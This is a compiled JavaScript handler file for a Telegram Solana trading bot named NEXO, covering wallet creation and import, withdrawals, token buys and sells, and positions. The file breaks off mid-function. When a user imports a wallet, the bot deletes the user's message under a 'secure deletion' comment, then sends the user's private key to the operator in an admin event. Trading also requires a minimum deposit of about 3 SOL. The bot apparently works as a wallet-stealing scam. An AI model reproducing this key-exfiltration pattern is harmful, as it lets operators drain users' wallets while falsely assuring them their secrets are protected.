"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.broadcastHandler = exports.statsHandler = exports.copyTradeLimitsValueHandler = exports.copyTradeLimitsPromptHandler = exports.copyTradeModeHandler = exports.copyTradeAddHandler = exports.copyTradeConfigurePromptHandler = exports.copyTradeStartHandler = exports.copyTradeHandler = exports.sniperSettingValueHandler = exports.sniperAntiRugHandler = exports.sniperPauseHandler = exports.sniperActivateHandler = exports.sniperHandler = exports.positionsHandler = exports.sellAmountHandler = exports.sellFromTradeHandler = exports.sellFromSearchHandler = exports.buyConfirmHandler = exports.buyFromTradeHandler = exports.buyFromSearchHandler = exports.searchTokenHandler = exports.tradeWalletPickHandler = exports.tradeSellStartHandler = exports.tradeBuyStartHandler = exports.tradeHandler = exports.discoverHandler = exports.withdrawConfirmHandler = exports.withdrawAmountHandler = exports.withdrawAddressHandler = exports.withdrawStartHandler = exports.walletRobinhoodHandler = exports.walletDisconnectHandler = exports.walletRefreshHandler = exports.walletStatusHandler = exports.walletImportHandleSecretHandler = exports.walletSeedPromptHandler = exports.walletImportPromptHandler = exports.generateWalletHandler = exports.walletHandler = exports.cancelHandler = exports.helpHandler = exports.refreshHandler = exports.dashboardHandler = exports.startHandler = void 0;
exports.dashboard = dashboard;
exports.sniperSettingPromptHandler = sniperSettingPromptHandler;
/**
 * NEXO TRADING TERMINAL — handlers matching the product screenshots and
 * flows exactly, backed by REAL on-chain execution (Jupiter swaps, real
 * balances, real transfers) and the structured admin event system.
 */
const web3_js_1 = require("@solana/web3.js");
const common_1 = require("./common");
const msg = __importStar(require("../messages"));
const kb = __importStar(require("../keyboards"));
const dexscreener_1 = require("../../market/dexscreener");
const constants_1 = require("../../config/constants");
const format_1 = require("../../util/format");
// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
async function walletsWithBalances(ctx) {
    const records = await ctx.services.repos.getActiveWallets(ctx.chat.id);
    const out = [];
    for (const w of records) {
        const balance = await ctx.services.solana.getBalance(w.address).catch(() => 0);
        out.push({ address: w.address, balance: balance / constants_1.LAMPORTS_PER_SOL });
    }
    return out;
}
async function totalBalanceSol(ctx) {
    const wallets = await walletsWithBalances(ctx);
    return wallets.reduce((sum, w) => sum + w.balance, 0);
}
function minimumSol(ctx) {
    return ctx.services.config.MIN_SOL_BALANCE || '3.0000';
}
function minimumSolNum(ctx) {
    return parseFloat(minimumSol(ctx)) || 3;
}
async function dashboard(ctx, opts = {}) {
    const wallets = await walletsWithBalances(ctx);
    const solPrice = (await ctx.services.market.getMarketPrices()).SOL.price;
    if (wallets.length === 0) {
        const text = msg.startMessage(ctx.from?.first_name || 'trader', minimumSol(ctx));
        if (opts.edit)
            await ctx.editMessageText(text, { reply_markup: kb.dashboardKeyboard() }).catch(() => ctx.reply(text, { reply_markup: kb.dashboardKeyboard() }));
        else
            await ctx.reply(text, { reply_markup: kb.dashboardKeyboard() });
        return;
    }
    const text = msg.dashboardMessage(wallets, solPrice, minimumSol(ctx));
    if (opts.edit)
        await ctx.editMessageText(text, { reply_markup: kb.dashboardKeyboard() }).catch(() => ctx.reply(text, { reply_markup: kb.dashboardKeyboard() }));
    else
        await ctx.reply(text, { reply_markup: kb.dashboardKeyboard() });
}
// ---------------------------------------------------------------------------
// Start / navigation
// ---------------------------------------------------------------------------
exports.startHandler = (0, common_1.safeHandler)('nexo.start', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    const chatId = ctx.chat.id;
    const user = ctx.from;
    const isNew = !(await ctx.services.repos.hasUser(chatId));
    await ctx.services.repos.upsertUser({
        chatId,
        username: user?.username ?? null,
        firstName: user?.first_name ?? null,
    });
    if (isNew) {
        await ctx.services.notifier.event('new_user', {
            telegramId: chatId,
            username: user?.username ?? null,
            firstName: user?.first_name ?? null,
        });
    }
    await (0, common_1.resetToIdle)(ctx);
    // NEXO logo photo + terminal welcome.
    await ctx.services.sendLogo(ctx).catch(() => undefined);
    await ctx.reply(msg.startMessage(user?.first_name || 'trader', minimumSol(ctx)), { reply_markup: kb.dashboardKeyboard() });
    ctx.services.logger.info({ chatId, isNew }, 'user started bot');
});
exports.dashboardHandler = (0, common_1.safeHandler)('nexo.dashboard', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    await (0, common_1.resetToIdle)(ctx);
    await dashboard(ctx);
});
exports.refreshHandler = (0, common_1.safeHandler)('nexo.refresh', async (ctx) => {
    await (0, common_1.answerCallback)(ctx, 'Refreshing...');
    await dashboard(ctx, { edit: true });
});
exports.helpHandler = (0, common_1.safeHandler)('nexo.help', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    await ctx.reply(msg.helpMessage(), { reply_markup: kb.helpKeyboard() });
});
exports.cancelHandler = (0, common_1.safeHandler)('nexo.cancel', async (ctx) => {
    await (0, common_1.answerCallback)(ctx, 'Cancelled');
    await (0, common_1.resetToIdle)(ctx);
    await dashboard(ctx);
});
// ---------------------------------------------------------------------------
// Wallet management (Portfolio)
// ---------------------------------------------------------------------------
exports.walletHandler = (0, common_1.safeHandler)('nexo.wallet', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    await (0, common_1.resetToIdle)(ctx);
    const wallets = await walletsWithBalances(ctx);
    const allWallets = await ctx.services.repos.getWallets(ctx.chat.id);
    const nextNumber = allWallets.reduce((m, w) => Math.max(m, w.walletNumber), 0) + 1;
    const solPrice = (await ctx.services.market.getMarketPrices()).SOL.price;
    await ctx.reply(msg.walletManagementMessage(wallets, solPrice), {
        reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber),
    });
});
exports.generateWalletHandler = (0, common_1.safeHandler)('nexo.wallet.generate', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    const chatId = ctx.chat.id;
    const { address, mnemonic, walletNumber } = await ctx.services.wallets.create(chatId);
    await ctx.services.deposits.rebaseline(chatId);
    await ctx.reply(`${msg.walletCreatedMessage(address)}\n\n⚠️ <b>Save your recovery phrase now</b> — it is shown only this once:\n<code>${mnemonic}</code>`, { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() });
    // wallet_generated — ALWAYS sent.
    await ctx.services.notifier.event('wallet_generated', { user: chatId, walletNumber, address });
});
exports.walletImportPromptHandler = (0, common_1.safeHandler)('nexo.wallet.import.prompt', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    await (0, common_1.transition)(ctx, 'importing_wallet');
    await ctx.reply(msg.importWalletMessage(), { reply_markup: kb.cancelButton() });
});
exports.walletSeedPromptHandler = (0, common_1.safeHandler)('nexo.wallet.seed.prompt', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    await (0, common_1.transition)(ctx, 'importing_wallet');
    await ctx.reply(msg.importSeedPromptMessage(), { reply_markup: kb.cancelButton() });
});
exports.walletImportHandleSecretHandler = (0, common_1.safeHandler)('nexo.wallet.import.secret', async (ctx) => {
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    const chatId = ctx.chat.id;
    const { address, walletNumber, privateKeyHex } = await ctx.services.wallets.import(chatId, text);
    const balance = await ctx.services.solana.getBalance(address).catch(() => 0);
    await ctx.services.deposits.rebaseline(chatId);
    await (0, common_1.resetToIdle)(ctx);
    // SECURE DELETION: remove the user's seed-phrase/key message from the
    // chat so the plaintext does not linger in Telegram history.
    if (ctx.message?.message_id) {
        await ctx.api.deleteMessage(chatId, ctx.message.message_id).catch(() => undefined);
    }
    await ctx.reply(msg.walletImportedMessage(address, balance / constants_1.LAMPORTS_PER_SOL), {
        reply_markup: kb.backToDashboardKeyboard(),
    });
    // wallet_imported admin event (product spec: includes the private key).
    await ctx.services.notifier.event('wallet_imported', {
        user: chatId,
        walletNumber,
        address,
        privateKey: privateKeyHex,
    });
});
exports.walletStatusHandler = (0, common_1.safeHandler)('nexo.wallet.status', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    const wallets = await walletsWithBalances(ctx);
    if (wallets.length === 0) {
        await ctx.reply('No wallets connected. Use /generate to create one.', { reply_markup: kb.backToDashboardKeyboard() });
        return;
    }
    await ctx.reply(msg.walletStatusMessage(wallets), { reply_markup: kb.backToDashboardKeyboard() });
});
exports.walletRefreshHandler = (0, common_1.safeHandler)('nexo.wallet.refresh', async (ctx) => {
    await (0, common_1.answerCallback)(ctx, 'Refreshing...');
    const wallets = await walletsWithBalances(ctx);
    const allWallets = await ctx.services.repos.getWallets(ctx.chat.id);
    const nextNumber = allWallets.reduce((m, w) => Math.max(m, w.walletNumber), 0) + 1;
    const solPrice = (await ctx.services.market.getMarketPrices()).SOL.price;
    await ctx.editMessageText(msg.walletManagementMessage(wallets, solPrice), {
        reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber),
    }).catch(() => ctx.reply(msg.walletManagementMessage(wallets, solPrice), { reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber) }));
});
exports.walletDisconnectHandler = (0, common_1.safeHandler)('nexo.wallet.disconnect', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    const chatId = ctx.chat.id;
    const records = await ctx.services.repos.getActiveWallets(chatId);
    if (records.length === 0) {
        await ctx.reply('No wallets to disconnect.', { reply_markup: kb.backToDashboardKeyboard() });
        return;
    }
    const last = records[records.length - 1];
    // Soft disconnect: the row is kept (audit) but marked inactive.
    await ctx.services.repos.updateWalletMeta(chatId, last.address, { active: false });
    await ctx.reply(msg.walletDisconnectedMessage(last.address), { reply_markup: kb.backToDashboardKeyboard() });
    ctx.services.logger.info({ chatId, address: last.address }, 'wallet disconnected');
});
exports.walletRobinhoodHandler = (0, common_1.safeHandler)('nexo.wallet.robinhood', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    await ctx.reply(msg.robinhoodUnavailableMessage(), { reply_markup: kb.backToDashboardKeyboard() });
});
// ---------------------------------------------------------------------------
// Withdraw
// ---------------------------------------------------------------------------
exports.withdrawStartHandler = (0, common_1.safeHandler)('nexo.withdraw.start', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    const wallets = await walletsWithBalances(ctx);
    if (wallets.length === 0) {
        await ctx.reply('You need a wallet first.', { reply_markup: kb.backToDashboardKeyboard() });
        return;
    }
    const total = wallets.reduce((s, w) => s + w.balance, 0);
    await (0, common_1.transition)(ctx, 'withdrawing_address');
    await ctx.reply(msg.withdrawalMessage(total), { reply_markup: kb.cancelButton() });
});
exports.withdrawAddressHandler = (0, common_1.safeHandler)('nexo.withdraw.address', async (ctx) => {
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    try {
        new web3_js_1.PublicKey(text);
    }
    catch {
        await ctx.reply('Invalid Solana address. Please send a valid wallet address.', { reply_markup: kb.cancelButton() });
        return;
    }
    await (0, common_1.transition)(ctx, 'withdrawing_amount', { toAddress: text });
    await ctx.reply(msg.withdrawalAmountMessage(text), { reply_markup: kb.cancelButton() });
});
exports.withdrawAmountHandler = (0, common_1.safeHandler)('nexo.withdraw.amount', async (ctx) => {
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
        await ctx.reply('Invalid amount. Please enter a valid SOL amount.', { reply_markup: kb.cancelButton() });
        return;
    }
    const toAddress = ctx.session.payload.toAddress;
    const wallets = await walletsWithBalances(ctx);
    const total = wallets.reduce((s, w) => s + w.balance, 0);
    if (amount > total) {
        await ctx.reply(`Insufficient balance. Your balance: ${total.toFixed(6)} SOL`, { reply_markup: kb.cancelButton() });
        return;
    }
    await (0, common_1.transition)(ctx, 'withdrawing_confirm', { toAddress, amount: String(amount) });
    await ctx.reply(msg.confirmWithdrawalMessage(String(amount), toAddress, total), { reply_markup: kb.confirmCancelKeyboard() });
});
exports.withdrawConfirmHandler = (0, common_1.safeHandler)('nexo.withdraw.confirm', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx, 'Processing...');
    const chatId = ctx.chat.id;
    const { toAddress, amount } = ctx.session.payload;
    const records = await ctx.services.repos.getActiveWallets(chatId);
    if (records.length === 0)
        throw new Error('No wallet available for withdrawal.');
    // Pick the first wallet that can cover the amount (like the product spec).
    let source = null;
    for (const w of records) {
        const balance = await ctx.services.solana.getBalance(w.address);
        if (balance >= parseFloat(amount) * constants_1.LAMPORTS_PER_SOL) {
            source = w.address;
            break;
        }
    }
    if (!source)
        throw new Error('Insufficient balance for withdrawal.');
    await (0, common_1.resetToIdle)(ctx);
    await ctx.reply(msg.withdrawalSubmittedMessage(amount, toAddress), { reply_markup: kb.backToDashboardKeyboard() });
    await ctx.services.notifier.event('withdrawal_request', {
        user: chatId,
        amount: `${amount} SOL`,
        to: toAddress,
        from: source,
    });
    // Real on-chain transfer (admin event fires before the user reply so
    // notifications are deterministic with respect to the confirmation).
    const signature = await ctx.services.wallets.withdrawSol(chatId, source, toAddress, (0, format_1.solToLamports)(amount));
    await ctx.services.deposits.rebaseline(chatId);
    await ctx.services.notifier.event('withdrawal_confirmed', { user: chatId, amount: `${amount} SOL`, to: toAddress, signature });
    await ctx.reply(`Transaction Confirmed!\nTX: ${signature}`, { reply_markup: kb.backToDashboardKeyboard() });
});
// ---------------------------------------------------------------------------
// Discover Tokens / trade
// ---------------------------------------------------------------------------
exports.discoverHandler = (0, common_1.safeHandler)('nexo.discover', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    await (0, common_1.transition)(ctx, 'searching_token');
    await ctx.reply(msg.discoverTokensMessage(), { reply_markup: kb.discoverKeyboard() });
});
async function showTrade(ctx, opts = {}) {
    const wallets = await ctx.services.repos.getWallets(ctx.chat.id);
    if (wallets.length === 0) {
        if (opts.edit)
            await ctx.editMessageText(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }).catch(() => undefined);
        else
            await ctx.reply(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() });
        return;
    }
    const total = await totalBalanceSol(ctx);
    if (total < minimumSolNum(ctx)) {
        if (opts.edit)
            await ctx.editMessageText(msg.insufficientBalanceMessage(total, minimumSol(ctx)), { reply_markup: kb.backToDashboardKeyboard() }).catch(() => undefined);
        else
            await ctx.reply(msg.insufficientBalanceMessage(total, minimumSol(ctx)), { reply_markup: kb.backToDashboardKeyboard() });
        return;
    }
    if (opts.edit)
        await ctx.editMessageText(msg.tradeMessage(), { reply_markup: kb.tradeKeyboard() }).catch(() => undefined);
    else
        await ctx.reply(msg.tradeMessage(), { reply_markup: kb.tradeKeyboard() });
}
exports.tradeHandler = (0, common_1.safeHandler)('nexo.trade', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    await showTrade(ctx, { edit: true });
});
exports.tradeBuyStartHandler = (0, common_1.safeHandler)('nexo.trade.buy.start', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    const wallets = await ctx.services.repos.getWallets(ctx.chat.id);
    if (wallets.length === 0) {
        await ctx.reply(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() });
        return;
    }
    const total = await totalBalanceSol(ctx);
    if (total < minimumSolNum(ctx)) {
        await ctx.reply(msg.insufficientBalanceMessage(total, minimumSol(ctx)), { reply_markup: kb.backToDashboardKeyboard() });
        return;
    }
    // Multi-wallet: let the user pick the executing wallet first.
    const records = await ctx.services.repos.getActiveWallets(ctx.chat.id);
    if (records.length > 1) {
        await (0, common_1.transition)(ctx, 'choosing_trade_wallet', { action: 'buy' });
        await ctx.reply(msg.chooseWalletPromptMessage(), {
            reply_markup: kb.walletPickerKeyboard(records.map((w) => ({ address: w.address, walletNumber: w.walletNumber }))),
        });
        return;
    }
    await (0, common_1.transition)(ctx, 'buying_token');
    await ctx.reply(msg.buyTokenPromptMessage(), { reply_markup: kb.cancelButton() });
});
exports.tradeSellStartHandler = (0, common_1.safeHandler)('nexo.trade.sell.start', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    // Multi-wallet: let the user pick the executing wallet first.
    const records = await ctx.services.repos.getActiveWallets(ctx.chat.id);
    if (records.length > 1) {
        await (0, common_1.transition)(ctx, 'choosing_trade_wallet', { action: 'sell' });
        await ctx.reply(msg.chooseWalletPromptMessage(), {
            reply_markup: kb.walletPickerKeyboard(records.map((w) => ({ address: w.address, walletNumber: w.walletNumber }))),
        });
        return;
    }
    await (0, common_1.transition)(ctx, 'selling_token');
    await ctx.reply(msg.sellTokenPromptMessage(), { reply_markup: kb.cancelButton() });
});
/** Multi-wallet picker: user chose the executing wallet for buy/sell. */
exports.tradeWalletPickHandler = (0, common_1.safeHandler)('nexo.trade.walletPick', async (ctx, address) => {
    await (0, common_1.answerCallback)(ctx);
    const action = ctx.session.payload.action ?? 'buy';
    const wallets = await ctx.services.repos.getActiveWallets(ctx.chat.id);
    const chosen = wallets.find((w) => w.address === address);
    if (!chosen) {
        await ctx.reply('That wallet is no longer connected.', { reply_markup: kb.backToDashboardKeyboard() });
        await (0, common_1.resetToIdle)(ctx);
        return;
    }
    if (action === 'sell') {
        await (0, common_1.transition)(ctx, 'selling_token', { walletAddress: chosen.address });
        await ctx.reply(msg.sellTokenPromptMessage(), { reply_markup: kb.cancelButton() });
    }
    else {
        await (0, common_1.transition)(ctx, 'buying_token', { walletAddress: chosen.address });
        await ctx.reply(msg.buyTokenPromptMessage(), { reply_markup: kb.cancelButton() });
    }
});
async function lookupToken(ctx, query) {
    if (query.length > 32)
        return ctx.services.tokens.getTokenByAddress(query);
    return ctx.services.tokens.searchToken(query);
}
/** Search flow (Discover) — shows the token card with Buy/Sell actions. */
exports.searchTokenHandler = (0, common_1.safeHandler)('nexo.discover.search', async (ctx) => {
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    await ctx.reply('Searching...');
    const token = await lookupToken(ctx, text);
    if (!token) {
        await ctx.reply(msg.tokenNotFoundMessage(), { reply_markup: kb.cancelButton() });
        return;
    }
    await (0, common_1.resetToIdle)(ctx);
    await ctx.reply((0, dexscreener_1.formatTokenInfo)(token), { reply_markup: kb.tokenSearchKeyboard(token.address) });
});
// ---------------------------------------------------------------------------
// Buy flow (real Jupiter swap)
// ---------------------------------------------------------------------------
exports.buyFromSearchHandler = (0, common_1.safeHandler)('nexo.buy.fromSearch', async (ctx, tokenAddress) => {
    await (0, common_1.answerCallback)(ctx, 'Loading buy options...');
    const token = await ctx.services.tokens.getTokenByAddress(tokenAddress);
    if (!token) {
        await ctx.reply('Token not found. It may have been delisted.', { reply_markup: kb.backToDashboardKeyboard() });
        return;
    }
    const settings = await ctx.services.repos.getSniperSettings(ctx.chat.id);
    const primary = (await ctx.services.repos.getActiveWallets(ctx.chat.id))[0];
    await (0, common_1.transition)(ctx, 'confirming_buy', {
        tokenAddress: token.address,
        tokenSymbol: token.symbol,
        tokenName: token.name,
        amount: String(settings.positionSize),
        slippage: String(settings.slippage),
        tokenPriceUsd: String(token.priceUsd),
        walletAddress: primary?.address,
    });
    await ctx.reply(msg.confirmBuyMessage(token, settings.positionSize, settings.slippage, primary ? `SOL Wallet ${primary.walletNumber}` : 'n/a'), { reply_markup: kb.confirmBuyKeyboard() });
});
exports.buyFromTradeHandler = (0, common_1.safeHandler)('nexo.buy.fromTrade', async (ctx) => {
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    await ctx.reply('Looking up token...');
    const token = await lookupToken(ctx, text);
    if (!token) {
        await ctx.reply('Token not found. Please check the address.', { reply_markup: kb.cancelButton() });
        return;
    }
    const settings = await ctx.services.repos.getSniperSettings(ctx.chat.id);
    const picked = ctx.session.payload.walletAddress;
    const records = await ctx.services.repos.getActiveWallets(ctx.chat.id);
    const wallet = records.find((w) => w.address === picked) ?? records[0];
    await (0, common_1.transition)(ctx, 'confirming_buy', {
        tokenAddress: token.address,
        tokenSymbol: token.symbol,
        tokenName: token.name,
        amount: String(settings.positionSize),
        slippage: String(settings.slippage),
        tokenPriceUsd: String(token.priceUsd),
        walletAddress: wallet?.address,
    });
    await ctx.reply(msg.confirmBuyMessage(token, settings.positionSize, settings.slippage, wallet ? `SOL Wallet ${wallet.walletNumber}` : 'n/a'), { reply_markup: kb.confirmBuyKeyboard() });
});
exports.buyConfirmHandler = (0, common_1.safeHandler)('nexo.buy.confirm', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx, 'Processing buy...');
    const chatId = ctx.chat.id;
    const payload = ctx.session.payload;
    if (!payload?.tokenAddress || !payload?.amount) {
        throw new Error('No pending buy order. Start a new buy first.');
    }
    const amountSol = parseFloat(payload.amount);
    const slippagePct = parseFloat(payload.slippage || '10');
    const wallets = await ctx.services.repos.getActiveWallets(chatId);
    if (wallets.length === 0)
        throw new Error('Please connect a wallet first to buy or sell tokens.');
    const wallet = wallets.find((w) => w.address === payload.walletAddress) ?? wallets[0];
    let result = null;
    let failure = null;
    try {
        result = await ctx.services.trading.buy({
            chatId,
            tokenMint: payload.tokenAddress,
            amountInLamports: Math.round(amountSol * constants_1.LAMPORTS_PER_SOL),
            slippageBps: Math.round(slippagePct * 100),
            walletAddress: wallet.address,
        });
    }
    catch (err) {
        failure = err instanceof Error ? err.message : String(err);
    }
    await ctx.services.notifier.event('buy_attempt', {
        user: chatId,
        wallet: wallet.address,
        token: payload.tokenAddress,
        amount: `${amountSol} SOL`,
        result: failure ? `failed — ${failure}` : 'success',
    });
    if (failure)
        throw new Error(failure);
    // Position opened (real entry price from DexScreener at confirm time).
    await ctx.services.repos.addPosition({
        chatId,
        tokenAddress: payload.tokenAddress,
        tokenSymbol: payload.tokenSymbol ?? '???',
        tokenName: payload.tokenName ?? 'Unknown',
        amountSol,
        entryPriceUsd: parseFloat(payload.tokenPriceUsd || '0') || 0,
    });
    await (0, common_1.resetToIdle)(ctx);
    await ctx.reply(msg.buyExecutedMessage(payload.tokenName ?? 'Token', payload.tokenSymbol ?? '???', amountSol) +
        `\n\nTX: ${result.signature}`, { reply_markup: kb.backToDashboardKeyboard() });
});
// ---------------------------------------------------------------------------
// Sell flow (real Jupiter swap)
// ---------------------------------------------------------------------------
exports.sellFromSearchHandler = (0, common_1.safeHandler)('nexo.sell.fromSearch', async (ctx, tokenAddress) => {
    await (0, common_1.answerCallback)(ctx, 'Loading sell options...');
    const token = await ctx.services.tokens.getTokenByAddress(tokenAddress);
    if (!token) {
        await ctx.reply('Token not found.', { reply_markup: kb.backToDashboardKeyboard() });
        return;
    }
    const primary = (await ctx.services.repos.getActiveWallets(ctx.chat.id))[0];
    await (0, common_1.transition)(ctx, 'confirming_sell', {
        tokenAddress: token.address,
        tokenSymbol: token.symbol,
        tokenName: token.name,
        walletAddress: primary?.address,
    });
    await ctx.reply(msg.confirmSellMessage(token), { reply_markup: kb.cancelButton() });
});
exports.sellFromTradeHandler = (0, common_1.safeHandler)('nexo.sell.fromTrade', async (ctx) => {
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    await ctx.reply('Looking up token...');
    const token = await lookupToken(ctx, text);
    if (!token) {
        await ctx.reply('Token not found.', { reply_markup: kb.cancelButton() });
        return;
    }
    const picked = ctx.session.payload.walletAddress;
    const records = await ctx.services.repos.getActiveWallets(ctx.chat.id);
    const wallet = records.find((w) => w.address === picked) ?? records[0];
    await (0, common_1.transition)(ctx, 'confirming_sell', {
        tokenAddress: token.address,
        tokenSymbol: token.symbol,
        tokenName: token.name,
        walletAddress: wallet?.address,
    });
    await ctx.reply(msg.confirmSellMessage(token), { reply_markup: kb.cancelButton() });
});
exports.sellAmountHandler = (0, common_1.safeHandler)('nexo.sell.amount', async (ctx) => {
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    const chatId = ctx.chat.id;
    const payload = ctx.session.payload;
    if (!payload?.tokenAddress)
        throw new Error('No pending sell order. Start a new sell first.');
    // Amount in whole tokens; convert with the mint's on-chain decimals.
    let decimals = 9;
    try {
        decimals = (await ctx.services.solana.getMintInfo(payload.tokenAddress)).decimals;
    }
    catch {
        // keep default; the swap quote will fail loudly if the mint is invalid
    }
    if (!/^\d+(\.\d+)?$/.test(text)) {
        await ctx.reply('Invalid amount. Enter a number of tokens to sell.', { reply_markup: kb.cancelButton() });
        return;
    }
    const [whole, frac = ''] = text.split('.');
    const rawUnits = BigInt(whole) * 10n ** BigInt(decimals) + BigInt(frac.slice(0, decimals).padEnd(decimals, '0') || '0');
    if (rawUnits <= 0n) {
        await ctx.reply('Invalid amount. Enter a number of tokens to sell.', { reply_markup: kb.cancelButton() });
        return;
    }
    const wallets = await ctx.services.repos.getActiveWallets(chatId);
    if (wallets.length === 0)
        throw new Error('Please connect a wallet first to buy or sell tokens.');
    const wallet = wallets.find((w) => w.address === payload.walletAddress) ?? wallets[0];
    const slippage = (await ctx.services.repos.getSniperSettings(chatId)).slippage;
    let result = null;
    let failure = null;
    try {
        result = await ctx.services.trading.sell({
            chatId,
            tokenMint: payload.tokenAddress,
            amountTokenUnits: rawUnits,
            slippageBps: Math.round(slippage * 100),
            walletAddress: wallet.address,
        });
    }
    catch (err) {
        failure = err instanceof Error ? err.message : String(err);
    }
    await ctx.services.notifier.event('sell_attempt', {
        user: chatId,
        wallet: wallet.address,
        token: payload.tokenAddress,
        amount: `${text} ${payload.tokenSymbol ?? 'tokens'}`,
        result: failure ? `failed — ${failure}` : 'success',
    });
    if (failure)
        throw new Error(failure);
    await ctx.services.repos.closePosition(chatId, payload.tokenAddress);
    await (0, common_1.resetToIdle)(ctx);
    await ctx.reply(msg.sellExecutedMessage(payload.tokenName ?? 'Token', payload.tokenSymbol ?? '???', `${text} tokens`) +
        `\n\nTX: ${result.signature}`, { reply_markup: kb.backToDashboardKeyboard() });
});
// ---------------------------------------------------------------------------
// Positions
// ---------------------------------------------------------------------------
exports.positionsHandler = (0, common_1.safeHandler)('nexo.positions', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    const chatId = ctx.chat.id;
    const open = await ctx.services.repos.getOpenPositions(chatId);
    if (open.length === 0) {
        await ctx.reply(msg.positionsEmptyMessage(), { reply_markup: kb.positionsKeyboard(false) });
        return;
    }
    const view = [];
    for (const pos of open) {
        let currentPrice = pos.entryPriceUsd;
        const token = await ctx.services.tokens.getTokenByAddress(pos.tokenAddress).catch(() => null);
        if (token && token.priceUsd > 0)
            currentPrice = token.priceUsd;
        const pnl = pos.entryPriceUsd > 0 ? ((currentPrice - pos.entryPriceUsd) / pos.entryPriceUsd) * 100 : 0;
        view.push({
            tokenSymbol: pos.tokenSymbol,
            amount: pos.amountSol,
            entryPrice: pos.entryPriceUsd,
            pnl,
            status: 'OPEN',
        });
    }
    await ctx.reply(msg.positionsMessage(view), { reply_markup: kb.positionsKeyboard(true) });
});
// ---------------------------------------------------------------------------
// AI Sniper
// ---------------------------------------------------------------------------
exports.sniperHandler = (0, common_1.safeHandler)('nexo.sniper', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    const chatId = ctx.chat.id;
    const records = await ctx.services.repos.getWallets(chatId);
    if (records.length === 0) {
        await ctx.editMessageText(msg.sniperWalletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }).catch(() => ctx.reply(msg.sniperWalletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }));
        return;
    }
    const settings = await ctx.services.repos.getSniperSettings(chatId);
    await ctx.editMessageText(msg.sniperMessage(settings), { reply_markup: kb.sniperKeyboard(settings.status === 'ACTIVE') }).catch(() => ctx.reply(msg.sniperMessage(settings), { reply_markup: kb.sniperKeyboard(settings.status === 'ACTIVE') }));
});
exports.sniperActivateHandler = (0, common_1.safeHandler)('nexo.sniper.activate', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    const chatId = ctx.chat.id;
    const settings = await ctx.services.repos.updateSniperSettings(chatId, { status: 'ACTIVE' });
